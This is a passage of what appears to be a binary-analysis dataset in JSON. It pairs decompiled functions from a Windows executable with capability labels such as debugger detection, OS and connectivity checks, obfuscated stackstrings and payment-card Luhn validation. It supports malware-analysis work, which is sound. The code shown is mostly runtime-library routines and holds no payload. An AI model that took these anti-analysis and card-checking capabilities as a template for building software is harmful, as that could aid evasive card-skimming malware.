*0x502830 = in_EAX;\n    *0x502834 = unaff_EBP;\n    *0x502838 = unaff_retaddr;\n    *0x50283c = in_CS;\n    *0x502848 = in_SS;\n    *0x502778 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00442d55(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x455074);\n    if (*0x502778 == 0) {\n        fcn.00442d55(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 808
    },
    "00442509": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442509(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x502348, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0043d0f9();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.0043d0b7(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "00441760": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00441760(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0043fb70(0x4573a0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0043d10c();\n        *puVar2 = 0;\n        puVar2 = fcn.0043d0f9();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x503df0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x503e40;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00445937(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0043d0f9();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0043d10c();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00441063(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0044182c();\n                goto code_r0x00441823;\n            }\n        }\n        puVar2 = fcn.0043d10c();\n        *puVar2 = 0;\n        puVar2 = fcn.0043d0f9();\n        *puVar2 = 9;\n        fcn.0043e92a();\n    }\ncode_r0x00441823:\n    fcn.0043fbb5();\n    return;\n}\n",
        "token_count": 617
    },
    "00445c84": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17",
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00445c84(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == unaff_EDI) {\n        puVar1 = *((unaff_ESI >> 5) * 4 + 0x503e40) + 4 + (unaff_ESI & 0x1f) * 0x40;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.004459d6(unaff_ESI);\n    return;\n}\n",
        "token_count": 158
    },
    "0040100a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.0040100a(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    for (var_8h = 0; var_8h < arg_ch / 8; var_8h = var_8h + 1) {\n        fcn.0040101e(arg_8h + var_8h * 8, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "0040100f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040100f(int32_t arg_8h)\n\n{\n    return arg_8h + 0x1f06;\n}\n",
        "token_count": 37
    },
    "00401028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\nvoid fcn.00401028(void)\n\n{\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4e2d24 = *0x458a90 + 0x8f176;\n    return;\n}\n",
        "token_count": 1259
    },
    "0043ce2e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ce2e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0043edc5(arg_8h, arg_ch, arg_10h, 0, &arg_14h);\n    return;\n}\n",
        "token_count": 70
    },
    "0043ce4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ce4c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0043edc5(arg_8h, arg_ch, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 78
    },
    "0043ce95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ce95(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0043ea89(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 54
    },
    "0043ceae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ceae(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0043eac2(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 55
    },
    "0043d550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d550(uint arg_8h)\n\n{\n    fcn.0043d410(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "0043ea6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ea6d(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0043ea11(fcn.0043dba6, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "0043ea89": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ea89(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0043ea11(fcn.0043dba6, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "0043eaa6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043eaa6(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0043ea11(fcn.00442fe7, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "0043eac2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043eac2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0043ea11(fcn.00442fe7, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 62
    },
    "0043eba9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043eba9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043eadf(fcn.0043dba6, arg_8h, arg_ch, arg_10h, 0, arg_14h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 109
    },
    "0043ebd2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043ebd2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043eadf(fcn.0043dba6, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 118
    },
    "0043ed9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043ed9c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043eadf(fcn.00442fe7, arg_8h, arg_ch, arg_10h, 0, arg_14h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 110
    },
    "0043edc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043edc5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043eadf(fcn.00442fe7, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 118
    },
    "0043f5f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043f5f4(void)\n\n{\n    code **ppcVar1;\n    \n    ppcVar1 = 0x456de4;\n    do {\n        if (*ppcVar1 != NULL) {\n            (**ppcVar1)();\n        }\n        ppcVar1 = ppcVar1 + 1;\n    } while (ppcVar1 < 0x456ee4);\n    return;\n}\n",
        "token_count": 93
    },
    "00442743": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00442743(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004418d3();\n    fcn.00441a59(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 54
    },
    "00442756": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442756(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00447a27(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "0044276f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044276f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00447a44(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 54
    },
    "00442788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442788(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00447a44(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 45
    },
    "004427a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004427a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00447a61(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 54
    },
    "004427b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004427b9(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00447a61(arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 46
    },
    "004479a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.004479a2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_8h_00;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0043fb70(0x457530, 0x10);\n    iVar1 = fcn.004418d3();\n    iVar1 = iVar1 + 0x20;\n    *(unaff_EBP + -0x1c) = iVar1;\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar2 = fcn.0043d0f9();\n        *puVar2 = 0x16;\n        fcn.0043e92a();\n    }\n    else {\n        fcn.004419aa(iVar1);\n        *(unaff_EBP + -4) = 0;\n        arg_8h_00 = fcn.004478d2(iVar1);\n        uVar3 = (**(unaff_EBP + 8))(iVar1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar3;\n        fcn.0044796e(arg_8h_00, iVar1);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00447a1f();\n    }\n    fcn.0043fbb5();\n    return;\n}\n",
        "token_count": 431
    },
    "00447a27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447a27(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004479a2(fcn.0043dba6, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "00447a44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447a44(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004479a2(fcn.004443a0, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "00447a61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447a61(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004479a2(fcn.00442fe7, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 61
    },
    "00447a7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447a7e(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004479a2(fcn.0043dba6, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "00447a9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447a9a(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004479a2(fcn.004443a0, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "00447ab6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447ab6(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004479a2(fcn.00442fe7, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 53
    },
    "0044b7e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.0044b7e0(int32_t *arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_10h == 1) {\n        uVar1 = *arg_8h;\n        uVar2 = *arg_ch;\n    }\n    else if (arg_10h == 2) {\n        uVar1 = *arg_8h;\n        uVar2 = *arg_ch;\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 1);\n        uVar2 = *(arg_ch + 1);\n    }\n    else if (arg_10h == 3) {\n        uVar1 = *arg_8h;\n        uVar2 = *arg_ch;\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 1);\n        uVar2 = *(arg_ch + 1);\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 2);\n        uVar2 = *(arg_ch + 2);\n    }\n    else {\n        if (arg_10h != 4) {\ncode_r0x0044bc52:\n    // switch table (32 cases) at 0x44ccb4\n            switch(arg_10h) {\n            case 0:\n                break;\n            case 1:\n                goto code_r0x0044c3c5;\n            case 2:\n                goto code_r0x0044c797;\n            case 3:\n                goto code_r0x0044cb80;\n            case 4:\n                goto code_r0x0044bf90;\n            case 5:\n                goto code_r0x0044c33e;\n            case 6:\n                goto code_r0x0044c710;\n            case 7:\n                goto code_r0x0044caf9;\n            case 8:\n                goto code_r0x0044bf09;\n            case 9:\n                goto code_r0x0044c2b6;\n            case 10:\n                goto code_r0x0044c688;\n            case 0xb:\n                goto code_r0x0044ca72;\n            case 0xc:\n                goto code_r0x0044be81;\n            case 0xd:\n                goto code_r0x0044c22f;\n            case 0xe:\n                goto code_r0x0044c601;\n            case 0xf:\n                goto code_r0x0044c9ea;\n            case 0x10:\n                goto code_r0x0044bdfa;\n            case 0x11:\n                goto code_r0x0044c1a8;\n            case 0x12:\n                goto code_r0x0044c57a;\n            case 0x13:\n                goto code_r0x0044c963;\n            case 0x14:\n                goto code_r0x0044bd73;\n            case 0x15:\n                goto code_r0x0044c121;\n            case 0x16:\n                goto code_r0x0044c4f3;\n            case 0x17:\n                goto code_r0x0044c8dc;\n            case 0x1a:\n                goto code_r0x0044c46c;\n            case 0x1b:\n                goto code_r0x0044c855;\n            case 0x1c:\n                uVar1 = *(arg_8h + arg_10h + -0x1c);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1c)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1c);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1b);\n                    uVar1 = *(arg_ch + arg_10h + -0x1b);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1a);\n                    uVar1 = *(arg_ch + arg_10h + -0x1a);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\n            case 0x18:\n                uVar1 = *(arg_8h + arg_10h + -0x18);\n                if (uVar1 == *(arg_ch + arg_10h + -0x18)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x18);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x17);\n                    uVar1 = *(arg_ch + arg_10h + -0x17);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x16);\n                    uVar1 = *(arg_ch + arg_10h + -0x16);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044bd73:\n                uVar1 = *(arg_8h + arg_10h + -0x14);\n                if (uVar1 == *(arg_ch + arg_10h + -0x14)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x14);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x13);\n                    uVar1 = *(arg_ch + arg_10h + -0x13);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x12);\n                    uVar1 = *(arg_ch + arg_10h + -0x12);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044bdfa:\n                uVar1 = *(arg_8h + arg_10h + -0x10);\n                if (uVar1 == *(arg_ch + arg_10h + -0x10)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x10);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xf);\n                    uVar1 = *(arg_ch + arg_10h + -0xf);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xe);\n                    uVar1 = *(arg_ch + arg_10h + -0xe);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044be81:\n                if (*(arg_8h + arg_10h + -0xc) == *(arg_ch + arg_10h + -0xc)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -0xc);\n                    uVar2 = *(arg_8h + arg_10h + -0xc);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xb);\n                    uVar1 = *(arg_ch + arg_10h + -0xb);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -10);\n                    uVar1 = *(arg_ch + arg_10h + -10);\n                    if 